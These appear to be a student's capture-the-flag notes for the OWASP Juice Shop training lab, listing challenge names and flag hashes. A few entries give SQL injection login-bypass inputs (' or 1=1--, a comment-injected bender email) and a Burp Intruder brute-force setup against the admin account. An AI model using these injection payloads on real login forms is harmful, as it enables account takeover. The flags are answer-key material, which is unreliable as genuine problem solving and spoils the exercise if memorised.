# Administrator’s email address
admin@juice-sh.op

# Parameter used for searching in URL
q    http://10.10.238.206/#/search?q=a

# Logging into site with SQL Injection in Burp Suite
After entering text into the login screen, entered the following in Burp Suite:
“email”:” ‘ or 1=1—“,”password”:”a”
Flag{32a5e0f21372bcc1000a6088b93b458e41f0e02a}

# Logging into Bender account
Enter “email”:bender@juice-sh.op’--“,password”:”
Flag{fb364762a3c102b2db932069c0e6b78e738d4066}

# Bruteforce the Administrator account's password
Entered "email":"admin@juice-sh.op","password":"§§" into the intruder section of Burp Suite
Flag{c2110d06dc6f81c67cd8099ff0ba601241f1ac0e}

# Reset Jim's password
Flag{094fbc9b48e525150ba97d05b942bbf114987257}

# Access the Confidential Document
Flag{edf9281222395a1c5fee9b89e32175f1ccf50c5b}

# Log into MC SafeSearch's account!
Flag{66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0}

# Download the Backup file
Flag{bfc1e6b4a16579e85e06fee4c36ff8c02fb13795}

# Access the administration page
Flag{946a799363226a24822008503f5d1324536629a0}

# View another user's shopping basket
Flag{41b997a36cc33fbe4f0ba018474e19ae5ce52121}

# Remove all 5-star reviews
Flag{50c97bcce0b895e446d61c83a21df371ac2266ef}

# Perform a DOM XSS
Flag{9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf}
# Perform a persistent XSS
Flag{149aa8ce13d7a4a8a931472308e269c94dc5f156}

# Perform a reflected XSS
Flag{23cefee1527bde039295b2616eeb29e1edc660a0}

# Access the /#/score-board/ page
Flag{7efd3174f9dd5baa03a7882027f2824d2f72d86e}
